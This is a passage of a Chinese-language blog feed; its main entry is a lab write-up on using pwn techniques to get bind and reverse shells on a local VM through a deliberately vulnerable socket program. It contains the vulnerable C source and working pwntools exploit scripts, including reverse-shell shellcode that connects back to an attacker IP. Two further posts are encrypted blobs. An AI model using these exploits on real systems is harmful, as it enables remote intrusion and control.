        <content type="html"><![CDATA[<h2 id="疑惑">疑惑</h2><p>从第一次接触pwn的到现在将近四个月了，每次做出来pwn题之后，把写好的脚本打到服务器上，就可以在服务器那边开启一个shell，然后用cat就可以读出我们需要的flag了。可是事实上我们真的可以用pwn的解题手法去进行一次攻击么？我们最后在对方主机去执行system(‘/bin/sh’)真的可以拿到shell么？</p><h2 id="实验环境">实验环境</h2><p>接下来的实验环境：</p><p>攻击者的机器是Ubuntu   ip:192.168.43.150</p><p>目标机是kali      ip:192.168.43.71</p><h2 id="对疑惑做一个简单的回答">对疑惑做一个简单的回答</h2><h3 id="先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。">先回答第一个问题（我们真的可以用pwn的解题手法去进行一次攻击么？）。</h3><p>可以的，因为接下来，我就演示一下利用与解pwn相同的思路完成一次最最最简单入侵（甚至简单到还需要目标机的配合），就是在目标机上运行一个有漏洞的程序，然后攻击者发送给目标机一个脚本，然后在攻击者的主机上开启一个shell，用来控制目标机</p><h3 id="再回答第二个问题（我们最后在对方主机去执行system-‘-bin-sh’-真的可以拿到shell么？）。">再回答第二个问题（我们最后在对方主机去执行system(‘/bin/sh’)真的可以拿到shell么？）。</h3><p>不可以的，如果仅仅是平常我们做题的脚本，发到了运行着漏洞程序的目标机上，执行了system(‘/bin/sh’)，仅仅是在目标机上开了一个shell，这个shell与攻击者的主机是没有任何关系的（如下图）</p><p><img src="../img/2706180-20220311170438374-343305220.png" alt=""></p><p>可以看到kali上确实开启了一个新的shell，但是这个shell跟攻击者是没关系的，可以看下ubuntu这边的情况（发现是没有任何回显的）。</p><p><img src="../img/2706180-20220311170452032-529076340.png" alt=""></p><h2 id="进攻的思路以及准备">进攻的思路以及准备</h2><h3 id="首先第一点，就是怎么找到目标机？">首先第一点，就是怎么找到目标机？</h3><p>对方也仅仅是个主机，它并不会像服务器那样暴露在公网上，而攻击者的主机和目标机就如同黑暗森林中带枪的猎人，无法直接被找到，而想要找到它，就需要不断的去接近它，最终猎人们彼此处于了同一片森林（也就是攻击者与目标机处于了同一个网段）。此时猎人试着用nmap工具扫描了一下，然后就发现了另一个猎人的ip（这个192.168.43.1是网关（gateway)）。</p><p><img src="../img/2706180-20220311170506140-1776303059.png" alt=""></p><p>猎人抱着试试看的心态，去扫描了一下这个ip。</p><p><img src="../img/2706180-20220311170524403-609189311.png" alt=""></p><p>发现了开放8888这个端口，而这个端口运行了一个无NX无canary且有溢出的程序（至于猎人怎么知道运行的是这个漏洞程序，这里不做讨论，毕竟这篇文章的目的是演示下最简单的进攻流程，而实际的环境中要比这个流程复杂很多）。</p><p>漏洞程序的源码如下（这里我用的是这位师傅的源码https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span>  s,c,j  =  <span class="number">0xe4ff</span>;<span class="comment">//留下的这个0xe4ff对应的小端序机器码就是jmp rsp,这样溢出到返回地址直接填写这个地址，就可以执行下面的shellcode了（就不需要再泄露地址了）</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span> </span><br><span class="line">  server.sin_family      = AF_INET;<span class="comment">//使用IPv4地址</span></span><br><span class="line">  server.sin_addr.s_addr = INADDR_ANY;<span class="comment">//INADDR_ANY为本机的IP</span></span><br><span class="line">  server.sin_port        = htons(<span class="number">8888</span>);<span class="comment">//开放的端口</span></span><br><span class="line"></span><br><span class="line">  s = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);<span class="comment">//第一个参数表示使用IPv4地址，第二个参数是表示套接字类型为面向连接的套接字，第三个参数为使用TCP传输协议</span></span><br><span class="line">      bind  (s,(<span class="keyword">struct</span> sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server));</span><br><span class="line">      listen(s,<span class="number">10</span>);</span><br><span class="line">  c = accept(s,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">      read  (c,buf,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用gcc test.c -fno-stack-protector -z execstack -no-pie -o test  #这里关闭了canary和NX保护</p><p><img src="../img/2706180-20220311170534186-1125823830.png" alt=""></p><p><img src="../img/2706180-20220311170542067-511506874.png" alt=""></p><p>用IDA看一下，得到了溢出的偏移（0x16+8)。</p><p>由于没有开启NX，我们使用shellcode。如果只是正常开启shell的shellcode的话，那就是本文最开始第二个问题所出现的情况（就是确实是开启了一个shell，但是开在了目标机上，跟攻击者没有任何关系）</p><p>因此这里我们就要换一种shellcode。在这之前还要学习一下正连与反连。</p><h2 id="正连（正向shell）">正连（正向shell）</h2><p>我大概说一下正连的原理。我们现在有一个<strong>shellcode</strong>，他的功能是<strong>在目标机上开启一个shell</strong>（现在看来功能和寻常获取shell的shellcode没什么区别），不过紧接着<strong>这个shellcode还会将刚刚开启的这个shell 的输入、输出绑定到我们指定的端口上（这个端口是在目标机上的）</strong>。然后<strong>我们继续利用pwntools去连接这个新开的端口，这样我们就获得了一个可以与目标机产生交互的shell（因为我们远程连接了目标机一个端口上的shell嘛）</strong>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)</span><br><span class="line">sc = asm(shellcraft.bindsh(<span class="number">4444</span>))<span class="comment">#这个意思就是开启一个shell，把这个shell绑定到4444端口</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+sc)<span class="comment">#这个偏移是30，但是好像不同的机器编译源码之后，这个偏移可能不一样。然后这个0x400669是jmp rsp的位置，这个不同电脑的这个指令位置也是不同的，还是要自己用ROPgadget搜一下吧。</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">4444</span>)<span class="comment">#然后再次连接到刚刚开启的shell上</span></span><br><span class="line">sh.interactive()<span class="comment">#这个交互是与sh交互，而不是与io交互</span></span><br></pre></td></tr></table></figure><p>因为kali是以root权限运行的漏洞程序，因此用脚本开启的shell就直接是root权限，还可以创建和删除文件。</p><p><img src="../img/2706180-20220311170554118-208807962.png" alt=""></p><p><img src="../img/2706180-20220311170602137-1122006877.png" alt=""></p><p>可以看到如果是以root权限开启shell的话，威力还是非常大的。也就是说被攻击者用什么权限运行的漏洞程序，攻击者远程获取的shell就是什么权限。</p><h2 id="反连（反向shell）">反连（反向shell）</h2><p>关于反弹shell可以阅读下面两篇文章</p><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p><p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p><p>利用这个反连的话，我们<strong>需要先监听本机的一个端口</strong>（你可以把这个监听理解成打开），然后也是利用一段shellcode，<strong>这个shellcode会实现反弹shell</strong>，<strong>将shell反弹到我在本机开的端口上去。然后用pwntools中的wait_for_connection函数等待着反连</strong>。等到反连成功后，即可在攻击者的窗口开启一个与目标机交互的shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = listen(<span class="number">4444</span>)<span class="comment">#在本机监听4444端口</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.43.71&quot;</span>,<span class="number">8888</span>)<span class="comment">#远程连接到目标机</span></span><br><span class="line">shellcode = asm(shellcraft.connect(<span class="string">&#x27;192.168.43.150&#x27;</span>,<span class="number">4444</span>)+shellcraft.dupsh())<span class="comment">#让目标机连接到我们本机开放的端口</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">30</span>+p64(<span class="number">0x400669</span>)+shellcode)</span><br><span class="line"></span><br><span class="line">sh.wait_for_connection()</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这次kali使用了普通用户来运行漏洞程序，可以看见这次攻击者就没有办法去创建或是删除文件了。</p><p><img src="../img/2706180-20220311170613647-976763824.png" alt=""></p><p><img src="../img/2706180-20220311170621593-1348201456.png" alt=""></p><p>总结一下正向shell和反向shell。<strong>在实际的攻击当中，正向shell是攻击者连接被攻击者的机器，可以用于攻击者身处内网，被攻击者身处外网的情况；而反向shell则是被攻击者主动连接攻击者，可以用于攻击者处于外网，被攻击者处于内网的情况</strong>。</p><p>其实本次攻击到此也就结束了，我们分别用正连和反连的方法获取了目标机的shell。但往往很多东西看着简单，但做的难。实际操作的时候就会遇见各种各样稀奇古怪的问题，也会绕许多弯路。</p><h2 id="在完成实验时所碰到的问题">在完成实验时所碰到的问题</h2><h3 id="1、同步网段问题">1、同步网段问题</h3><p>首先是将两个虚拟机部署在同一个网段的问题，正常情况下，只需要让虚拟机开桥接模式即可。</p><p><img src="../img/2706180-20220311170629421-1313264995.png" alt=""></p><p><strong>这是正常情况下，开启桥接模式之后，虚拟机就会和主机在同一个网段下面</strong>，只要让两台主机去连一个相同的热点，这样ubuntu和kali就可以处于在一个网段上了。但天有不测风云，我的电脑开启桥接之后，虚拟机和主机并不在一个网段上。</p><p>我采用的解决方法是让VMnet0桥接到物理网卡上。</p><p><img src="../img/2706180-20220311170636696-617709141.png" alt=""></p><p>然后在网络适配器这里改成自定义，去连接VMnet0。<strong>（因为我当时不知道咋搞的，把虚拟网卡弄没了一个，用这个方法的话，可以让自己的两个虚拟机都桥接到一个物理网卡上面）</strong><br><img src="../img/2706180-20220311170644194-2024796383.png" alt=""></p><p>最后两个虚拟机都处于了同一网段。</p><h3 id="2、socat工具绑定端口出现的问题">2、socat工具绑定端口出现的问题</h3><p>最开始的时候，我写了一个只有漏洞的程序（没有开启端口这部分），然后我是用socat工具去绑定的。绑定的也很成功。然后就去写脚本打，可是不管怎么打脚本，最后得到的都是EOF</p><p><img src="../img/2706180-20220311170650236-893387920.png" alt=""></p><p>请教了roderick师傅之后，得出来的结论是<strong>socat不知道因为什么原因，等到shellcode执行之后，关闭了socket。因此这里的端口与进程绑定不能用socat工具来绑定了</strong>，就采用了https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/这个师傅博客上的涉及思路，在漏洞程序源码上，加一段将自身绑定给端口的代码。这样运行漏洞程序之后自己就与指定的端口绑定了。</p><p>感悟：一次非常非常简单的攻击**（简单到有的地方甚至还需要被攻击者的配合，真正的情况中，攻击者怎么才能知道被攻击者开放的端口里正好运行了漏洞程序，而攻击者又恰好有一个脚本？这些在本文章都没有探究或者说目前以我的水平也没法去想这些。但是不影响在我们建立假设的前提下去进行一些实验和思考）**，在实验的过程中碰到了很多小问题，有的是卡了一会，有的则是卡了一天，如同上面第二个那个问题，描述它很简单，只用了两句话，但是发现这个问题所在却是用了一天多的时间。看别人操作总是感觉很简单，包括自己的所认为的思路也想的很简单，有时候我们认为不可能出现问题的地方，却恰恰是卡了我们很久的地方。<strong>因此在平常的做题以及学习的过程中，还是要多去思考，多去问，多去实践，才能更快的进步。</strong></p><p>最后本文还要感谢 <a href="https://roderickchan.github.io">roderick师傅</a> 以及我的两位同学（<a href="https://www.timochan.cn">提莫酱</a> 和 <a href="https://www.cnblogs.com/LQ-Joker">joker</a>），如果没有他们的帮助，也许我还会绕很多弯路。</p><p>参考文章：</p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/13/getshell3/</a></p><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p><p><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于popal指令的一道pwn</title>
      <link href="/posts/8179f351.html"/>
      <url>/posts/8179f351.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4598a095e6d78fd3b4542d6647634b07e0cfb12fcdb2804df549ffa3c4d61675">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a401e613038619dbf66d848ad22bd4a7df73fae2f2c34aef9c0faea23d6f111b482d09ee808da26e3a8598bf8e5e2a035f98ae30a985ce09398addfb1d4a3bee714e8bbbc1eeed5e66401bd415f5505339be496108094e2606d1c85a1ba0de12f3f1d31a46a3b32ebbb39b19697ea12a77ae2458e11e9471393cbd8ad6128b02474e307dd3341506214936ef2ce9412a5473cc19e9d685423bfcc94f2a07d7ea1fe7d05b60ea7da0961fedf3413fe89bb6331ff54564adf761785037752d094f7de35f41bdb7204976d541025ff5b7d5fa9110c1f62a88bf4b5a19e76eddfb178b1027f7e34045bb3825a5ecacef660fe7d5cbb00614fd180d9508ebb813e92d31b798606fdb4a9616a6d86739945df274ecbae8f0b15e697f68d5cece2f5bea77441a0471ca1a1a0a7821430ca2cdc1ea547b496857d302cced0990f93ffcf81c6211b9d4fed6102ae9e43c224a158dbe040d545a30a661cb50f679f65e64067059890ac9b736fe0117ec04cf687a94100925328ebf3da811e6f2acb7077d4b682206e8a45f6f43b032af1f63fb583d53377aa5113bfe912413bb9700b52d579e29855bb5927125c5123249a888ea8732fb33d9f393262d6add9ff88508b4b264dc828d8dede5bdec2596bb33f4b345ab96ae9e6838ffb9278ab0f369c8e2e4f565e27b0fc9999cd56289684efe9acee1cdbb39588a397a628f90dd96fead1ac6421e976b26e090f605e0283449e79467eafddd2935a8b6187bf6724d1c518b27f5b94054ff9b78465dab8750511f8d31a7f42e3ed57238c299bd98464b9d2a325092c45aea23fb8ee4cb2aa1ec68943aa5ecdb6a2d8cbabec00ccb4b68414021e3fa4220bfb0794cc171a4ac40765775527ee3c9802acf93782cb12affce2c73714a8a3838f7047bd7a5fb8bcc6df1928b4b7db8e8ce6aa0fa72f662229ca0cf6d7d2166504ac5486cba0b7621f1b85a2486d7b046a7a9f7c4cf8182d4480377c6646d032d762fae7626bdc77507d11b3e0d49c782374b61e6c1f6aec1c77788366f849efdb83617b79fe18406189b67c90962e9490ddea34330cd399e2ff89e0df73e737e7ae17b5f321ac0853b1689c1c93783189b3c87fc9be3820367c683029ea9064a8a5b8463ce0145505b69e742a33ed445ba5c50156fd1a1e1ec6165b7276a972ab9599f115ec94134494a5196a0b24d439a7b0610a45858e809b37a073c67b707261fe47340a8e9a78b3a5439b443539f5e8b2c540a6ad6d4fb116a4eb7326240562a050ef18f3d69c8b8bcec374d4df283067d975f407e99e851cbed29d25a566c56fd7475cb8e07a069aaf82ddfe967e86b69b92a7045efcd21f8d7aa952e4305a82c2268232ac487fb0eaa39b94b64be3f5a2b8c21dce4bebb537e50ed31699588c84e85ed8bb4233ae15b53d145ad9922a47f1743128f221c328a4eb8620d63ac772fdb676e40897cb853e850564c510ad79da7011c0777e3255cede28bfcf4c36b9e952ac49a7070dbf9cda430ec2b892d24aaba8d59e69de3d65a491faa0e09243ff73cc9f5eebe7b481fd658f909788ce62dc841a49fdf804636b312928ecc2fed1b1db7e1e6455e53988e16c4b64fbc830245c1a9ea5a01befc682f2e1368f41f84448c82a0ab10c5a6d5a443a6f95b404ae3e116134a016fc2af79bc3c12210795472c804e7ea9ef0f01be26f91a2378689419414e8e5b0b073aced816e82daa68a0f89d2dc20acf61c99e44bc66ee13fbd9ad2c50d7a525b4e3712d68e50371bd6703f9b8db83c5cd038f6b69d101e34a35eedcd3b1d644b37dbc254c5e41e5df7e337c75e036fb99eac55dd827490c97b433baea78ab729803aad23601f9b5f0dccc1b0b2a914626e44be5b0d365529483807d0d38e5028509acf22ec7d6596de3d23ec317df25ee66f9e1066d7a26b9966253e2aa2e398468ba505e8998bbdaba60aeddfe19961a3c03c825841aa84e7b610edc412474d69ae7304ae166fa54a68d36799ffb66bfce26395484b6f2f100599a8bc33e35313fe6f31c4574791f4eba00bd37fc3816cc7f7e407c7eb257b92225cfefac5364f5f98069485af05747f845bb101c6a26906bb06552a66d6dd3c332fa5e0524e19a8900eb9248d4e0672815d7393046bc32a08439e31d8ebc1ff107991beb23cf86726ce4f6241d1f7e2fbf3a904a33549c00fd02dc9edfbb41cdd67ce9c6d2bd85bd8587a0ac9022386347c2dcc3e33fd415ca8f77754aa7006aeb71528f4b9fce3dbd1637b71841a0cc8d9f013126661c4d4ac5531d5e8b802ebdd767facdb3bdf673453bfa908ce2f9cc2a9587b19da443d5e9af4350264f8d247cece57f28486a455bc9b1ba8a0e9907d9ac3f4bccd9a9212b82f1d426e05c1d17477c79f72bfcb4bcf201baafb8d212eb6392c7f5de3adea3f7e60312a8ce38966e6d4f12b8643134b3c9e2469fddb887b3e59c057de0bcb406f27459b8cd5c82fc3187bcdf7d6d049c43207a07a35be9fa4a8acbf554224ff58ed177ef1eeaaeaaa1618bf633665e2b6356784761974a7aa51f4f6932dd6f4c47ca69666245e98bdb821991913b3bb9969f69a93ef1faef6507699ee3ecb461784dd6b4b9a929496b6f55dac9011ce1243165ae17a1bf4f8254ab8450549da0d63f3f1b7065f5da1a99cd07aa8fa2aeb4039c6fd3ab23e2469f9deb1d245e0afe74076f17787cc8091c4e53ada1a1325dcf95b4c448e326b76ccea5e8e91b0ca91e48172dd5e22f5968e8baa23808ce045c6bdd0bbb5f8fc5c280b147d2ce2073cf589aaf258cbb4d90124f053cda1fb1e09ef2dcb74b34041df6cee57e6e2212e5cb894499da5a2a8839d95cf55d0fbaa29a104ed298d9d67e8197a639f04b8c421efcad42b5e60a9a88a479c20bc108400af9badfb478ee16fd36211caecbc750a6089ca3168c02f021a69fab0e8db6c40e4b13dd08ba97f8d0d613ecb664972aee53d3359f009a04af4387767dbb38af4e6ede92830f4ad6e6b8bce33b1cf6c31131a0bcbe68b889ac148b8933f7f7494c6aa305416b1044719f79f3ea8447f843e4c3eb56b16571e82eb17da07c812482b7ab81105c791c6152a23e7d7018c344a2ea0f074198b33b21639ab197629aa1fd14ffaee177d4e10845aa1058dc07731eeffda7aa788086dd1261f001485df8c1acfb420e19e188c7eac52b7a7e4ef16d12f04c1bb63b7f185b0f8e12e5b25f0b4fa187fab0dec4a59859cca2729efccdd38a20151d40af041202218c8a44bc8773c781e9d72e3cfe104347a3286d4063aedf7d72a41422033d7a9e0d7523cc0a4817c233f6d42733536d96d742510c2eeedd00341416a5f6f172e3179f0b3e7baf93ecf1bba456a6238226f56c978a33262c9a7b61cd1930d746b2153b0b9ddb264740b681e42d8ce482242dbc1b6a3aec26d8731916e3273454ce9d7b2081ec477819b5da3e2352bc92ba57bae7650a3dc62d04d0e1ef4c72b2f928750a28cea4154c71641078964c534276bc0b9361b5f09a39aff827f8017f029d1bd1633822e71a23ecadf6923b62a63482433a44f674aadca6b94af0025a989e10042f8b3162719a8f6a46eefd20e6beee2bdd62474e9d504681bb4df9088a074ad0ff3fe3fd512b97f5f1d2b55535e0a7a0a43d8196a67be0acf22ff17502abce195aba79dd95991527f4906f66332c77cd98a6525d86e48ff21647e0b7f2ed8ec0e78155b9f094c2a342c07f41004b2fe51945a66e6be5dff08fe837669e3fd704e3915d281c691b2d5109c01d596144dbec3bc10c51904704ef0665d14b2b30fe5bf032451958b674f2986e623ed78c7303c81a2b80f0e9493dc6fc7872562d5642ee67810fc87fa4ceb052bc9bc8bf46ee5fd89d97ce17b5dd975fdcdef0bb9eb91f2fc30337716a5d3d788708f79dbcceba13caf0cbbf920d0e1a5c606c59dc6186867022f50663eb6a9b7abc9b5051e76fd757212036c916c25e27508126e6c322d5aebee6355e8be5a1314583481f9f3f981ea644e2fa65a78c3b1d9cfc680b48505cfafcaa7901ce9c5345ffbe48011b372e69539419a96d56a955f8d894cf9ea2d18a2a0a0731e2e3e91ef64d1e093f4ff7c697d1748beda15ca91881487ed1b90f47c4a7425b333ecca5dcce7f7b8fbb29dca4367032b1187acf45e3e7944c8f93e73352c94a625b91d0e8cd45196abbeb179aba04b9b16ed3302eed3b90b06ec2f957ce5439c31a67826ee62238ecc73f7d4a4e951e4a7bd4f3474781942fa7a618d73148abe4976e6702d9db5c62eddf70985ecdd0dac05806296c1f812631857913fc85467cc57456eb79742c0dbb429e5897ebde65903d90b9fc25d623374c534c6bf5b3c45c38a7863f054a430bc874680f10ea431ec8f8bfd8df2d7dd6d476da0f1b6b1bef6842a0f567162bd1f9949b82899a2f856e7cb153ac0097aa7e8a5fdec8e5b0e4e360d3da8bc3314f0f3e72689c984ceefb5df2fc6f726af81fb2ca394a957d7043fe1698e2bab6e173f2b94949dd766ab606bfcaf61bd7db619670527776e8d9d8667c84882376137961b80e28e38af3f0a1ac479d9b69d35d24ff3ae18b37ca0eab83d8d61b4563001263d04790278fb32b65df52c6c10495bcc08225ee6291e0fb68bdcd089b807dcf06b865c52e31cdf775ece9eb5d04a6874f0ceedd8095b8f9f66d7f2b37008d5f8f1331d15c785069bef311f06a4ac4efa9d65d78a1a3ead35f9f13f944f1f9dc388ae638394bba344e9e8b75fc3e590472f9693ef070b5a9c937ed3523f6ac673f43ca4ec06d29494cc86b92c2e7d4f4641385a1c187d8b0625206ed81c2444f87e92782e7ab957f194a82c4c88619f380bfcffc6b94919217efb8beb821e021ae1126064fee585daecf28522ee2096bc04b2a26cf2f08e8aff41f1f48051cd2bb31a7ebdccd0538f64657a9c601ef3a26874a6e289e8884f7fbb61802d7342971062e68797922dd1d51264d4ebf084693a9b4bd09f6e72abe5d6b12e4c614b6297ee8ba91ec5f7bc63ce7106ccbaed494b472410237ab47f59954e94da656b848af1b02eb1194f0722b90139b2ae2b6aec037ebfac323c8efde7e8befcddca78cf6630f67a1e49fb11ef3c3449cc3bab120c203b4af54b46eba8bf1ac415eea2aab6c56f4c4c472d80b7cf274735a39576e4746af6d101498283a3be7a99d204cc7b5c22d26b47adf3ccc5f1661ea1f9e245e6742efb2936f059ebeed0179acf5bfc863dcb42295b6a5e8748839be01ed8911ad5b93e51420d24a31a921270f613f0a60ca28b91cf418dcb42703fbd44a0499e3df9e3f9c0568755eb02650f02e291b6daf61613eed0b8a0092f591bb325d44be86b4d86077c03c0cb184b51f8750cf193e817a69521192b7c3fd0555a81cc9fb472147cae14393bb68296cc8c2634caee6f3fc5b67035ab7334975fc2f33ea2d4bdccb66752c4842cc2f92e031e66446aa208a5f5c5ab724a23751d399f88d2372501801eb5488374f66358a6a2135bb30ece9345af24057e8643383b143eafae7986274ece85919d57829d572b81bc4b3ba9621344e5e6355719415808c1224ec13bb124de2c5a7d211502192e94161171158ef5fb7a5d6c31ccf94f78809d0685fac764e1b51c9c1d78e38fddb38417fd34eb02f0cabe7b5e666d05aa5c16893380a629074ea2f5c1ab29a84f29c98a20c3ca1f6992d83d6180aae59c8ef20505b4ab3067c56824620cf941a75d2dc39859b312c64acd6c39bd6d7f0aa0060c72b2a77e7948105acafa8006d07b7f92cc37ee86b4863ba497a3b18c2cf584dabd466619ffaaa66ff540b2a13a8ed234e0cc6b81173f4865d0902f17d42c5ef9a87d4a24103d4a43730acd7375ab22052366d973b974eb9ff2ddfeaa7b0b0f1935f6f1045d0e9e41833daa151b3b9eb52ac1d18b30c075a288bcd457929a30cd4dbbe65dd4d98697ad66aee8fc76709bc0597638744af11a4ecdf7329f99868b7b8699c89d6a957ced0ccd8a3dc31e34ee0585621b523bdce12bed9148c6d9eb2d2e1cac453931bffea9c6bd73b3ec3eb268bd3438c64accaafce57ef1a6ee5271cc622d5191496c770a9ac50f323eb76887b781d210635ea5b17372d88285d1c83e12e8e898653cb87dedbfb73b14c37cefedc8e2ef4efb47f1e254b0fb7c9096b4003b513f3785d2d7ea7970e4c30f3ad68351021f0ecfee2c2f64978e895288a0b6f5c331db30ea923970121200c4bce5c2921b7db460b7ad8df06c43a299f67be3421c35d5c812c8e96cb47f9567ddea0429695571c4a13a30ade2548d381c2cac69283bcca74a57396b2bb6240d07b4109cad96217c5f189c14dbd4c6ed0ecf68a0428bb9701f6187715f5065046432264430c03b893f5d6c91c00e786c95b97bc114726aa102d4bd8fda098d70515860953d708e492bc2ec0c6749dec1c4138b2a06bc52e40b707df51901b4d0d16ab90752e1b12fdbd6332cb92da37c003cf36e02e56bfa37d9937ff9247ded7ff93fe7d60211b8023bfae1268fee63c54df6d18276f1403a63438b94f52d5a48bd55d0c1f2bf08b7de06ad53f3b47298c2289d1ed62a89f21ae070def811767d232d695c0b2ea7ed0e9a5258e40c55a3df8a42e20423e132b755b5333113a547446a78aa088a00ef096192fd5d68581cefc0f774ac1e3f85d29d1c64b623eae4a815913a138ba8f63aa85a06e525541caa74046d51bc777213e01a8a7453c5b20977ddcb676cba7cedb6b6cc2cf527d33fe8169a5a57b705347d2087290b78b199bbd285823811fa45569c84b3af9577c380b6f88461efbdd67e1fccef0be090b246e585abde592c6c2ade8955c7d705dc4d9003b5620fad0010e977d46a2dc112e3cace1f52251d7fd3206d629e64f7265b38fd8faa24c1bdff52b2a7657d8d08e30954754c5f0f0804c975aed822b78438de3655098c5accd5540919d0fc03a6706d5803bc9211c848a1d77e4b4f2a381e456e54ff0b05a3332475d39fd98b645976b5d85adaa151d758b2b2c60791073dd4829de315bf9fcd589209019b5a088db2babb4dfbd38f9ff9db9ce650d33df288e124a7d4db6a21a27a8666e3d56a13aa0a26febc69dbe3a9c2ae8a3859ec610b246aff722c9ed80ad94ae6e9b815385529f3e7b478edce100ab596c124b096ae13a0aa46f0ffea3706bdad1c1f620b48159dd5b9e3d3d4cf363a2a5e224af04d5ab386e1c38684a74d33619c88cf91b044ea1a2dd29bed762f520d1709e69a86bb5b3cd13924c80990a2096145d4d52ea6dfaa69f768bba3dc6927d18ebc260150046d34a443a18b839b6ca1c877c2095a8369ef0276b8e8f91063e3ed0c4fbb6257606031f6d3d161721bd35234e5a3f608e2a9cdaba774681703c2f615aa092ff3105f87024a326474ff7781c523c932ffddb5c45d4331a749a515ece3cecdc94c26bdc768c346e6e0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 私房菜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lab </tag>
            
            <tag> popal指令 </tag>
            
            <tag> trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未初始化漏洞--strcat函数溢出</title>
      <link href="/posts/5bd42122.html"/>
      <url>/posts/5bd42122.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1c4cf9266cd9db321cab9822582cc737602203bd2cb46990634cae007a7ae3f8">0e96a196e04ab582d32680aaeaf05fdc0ff4581cd2e016adf497a33e0f0f5a40484a6afeac40902e9ff549d2af3cec53cc4e3c6fc24a5b3994f3288382c5044737862353fd402eb03cdfca270ede2ed396162d6af053b044a8a2eae4ba63547ab165ef176c1adcfdb6716905c091a047101e406535b2eee82daff6b72b970120adc0b34296e8f5c5da1748744ef066baf83659bf52fa0456225d6493e04996d125d42d730905ddb812055e50e6f99ace4d08fc8a04973662ab2c3f20193420a7ffff3aefd1a290d8e53a52ba4f32ec7c4992384dd09aea638370a7fb4670051b213603d954ba9642add8160ccf8d6d705a48603dfe7264f4fed3a3fdae17e1294eb4d9b51e4cbd78903b0808d0b83f2a0a56632e60740f5c56105944381718f80b2ccfc659f47189bbd3423824c34af75bde6048249e5718b3d417aad7ffb1a642a0c42121a985c4af41db69a70f1984cf6cfa5bf8247b26cbdfff4bc724c1f252aff6fb2703259bb9b231e6f6620c8071b706da738f8b7f3befd723507c0905d7ab85c54392c4cb9c5456083036795285a818b0305f104d1d9fa066f5a60f84d48fe5fa91dae3703bfac654c38ee8de1456fca3652ce701ecbba1f5bf91464ff45e941b4ac067a308ec6b804eeaab13a81d415c45b6567f0242765c0f08a47ce0a81440963eb651a1c977bd77dc51d76cd58e73c7471842cc9cc456cca6522167ab95041421ca78d0416dbe43890b7d2b9ef72293626696dd00e74be916671609341adc6e6afc1bc89586045d499058a5bea4501fb5d6